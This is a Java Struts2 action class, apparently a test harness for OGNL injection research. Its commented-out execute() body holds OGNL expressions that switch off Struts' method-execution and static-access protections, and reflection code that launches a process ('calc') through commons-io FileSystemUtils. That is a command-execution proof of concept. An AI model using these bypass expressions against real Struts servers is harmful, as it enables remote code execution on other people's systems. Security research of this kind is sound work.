package action;

import java.io.PrintWriter;
import java.lang.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

import org.apache.commons.io.FileSystemUtils;
import org.apache.struts2.ServletActionContext;

import ognl.Ognl;

import sun.org.mozilla.javascript.internal.Context;

import com.opensymphony.xwork2.ActionContext;
import com.opensymphony.xwork2.ActionSupport;
import com.opensymphony.xwork2.util.ValueStack;


public class HelloWorldAction extends ActionSupport {
	  
	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	private String foo;
	private String genxor;
	
	  public void setFoo(String foo) {
	    this.foo = foo;
	  }
	  
	  public String getFoo() {
		  return foo;
	  }
	  
	  public void setgenxor(String genxor) {
		  this.genxor = genxor;
	  }
	  
	  public String getgenxor() {
		  return genxor;
	  }
	  
	  public String execute() throws Exception {
		  /*
		  final ActionContext ctx = ActionContext.getContext();
		  ValueStack stack = (ValueStack) ctx.get(ActionContext.VALUE_STACK);
		  stack.findValue("#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
		  		"#f=#_memberAccess.getClass().getDeclaredField(\"allowStaticMethodAccess\")," +
				 "#f.setAccessible(true),#f.set(#_memberAccess,true)");
		  /*
		  FileSystemUtils fs = new FileSystemUtils();
		  Method m = fs.getClass().getDeclaredMethod("openProcess", java.lang.String[].class);
		  //Method m = fs.getClass().getDeclaredMethods()[0];
		  m.setAccessible(true);
		  m.invoke(fs, new java.lang.Object[]{new java.lang.String[]{"calc"}});
		  
		  PrintWriter res = ServletActionContext.getResponse().getWriter();
		  res.println(m);
		  res.close();
		  
		  String cmd = //"#m=\"freeSpaceKb\",#fs=new org.apache.commons.io.FileSystemUtils()," +
		  		//"#fi = #fs.getClass().getDeclaredMethod(#m)," +
				"#fs = Class.forName(\"org.apache.commons.io.FileSystemUtils\")," +
				"#fi = #fs.getDeclaredMethod(\"freeSpaceKb\")," +
		  		//"#fi.setAccessible(true)," +
		  		//"#fi.invoke(#fs,\"aaa\")," +
		  		"#genxor=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\")," +
		  		"#genxor.getWriter().println(#fs)";
		  PrintWriter writer = ServletActionContext.getResponse().getWriter();
          writer.print(stack.findValue(cmd));
          writer.close();
          //System.out.println(foo);
          
          */
		  return SUCCESS;
	  }
	  
	}

	
